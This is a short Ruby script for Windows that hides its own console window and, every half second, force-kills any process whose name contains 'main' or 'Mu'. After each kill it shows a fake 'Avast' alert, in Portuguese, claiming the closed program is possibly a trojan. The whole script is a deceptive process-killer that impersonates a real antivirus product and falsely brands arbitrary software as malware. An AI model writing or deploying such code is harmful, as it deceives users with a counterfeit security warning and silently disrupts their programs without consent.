puts "By: PedroHLC"
puts "Version: 0.5 BETA"

windows = ENV['SystemRoot'].to_s
system32 = (windows.gsub('\\','/') + '/system32/').to_s
$LOAD_PATH.push(system32)

require('Win32API.so')
require('win32ole.so')

$main_wid = Win32API.new("kernel32" , "GetConsoleWindow" , '' , 'L').call
$swp = Win32API.new('user32', 'SetWindowPos', 'LLIIIIL', 'I') 
$swp.call($main_wid, 0, 0, 0, 0, 0, 0x0080)

$mb = Win32API.new('user32', 'MessageBox', 'ippi', 'i')
$wmi = WIN32OLE.connect("winmgmts://")

loop do
  processes = $wmi.ExecQuery("select * from win32_process")
  for process in processes
    if (process.Name.to_s.include?('main') or process.Name.to_s.include?('Mu')) and !process.Name.to_s.include?('Kill')
      system("taskkill /IM #{process.Name} /T /F")
      $mb.call(0, "'#{process.Name}' é possivelmente um trojan e foi fechado!", 'Avast', 48)
    end
  end
  sleep(0.5)
end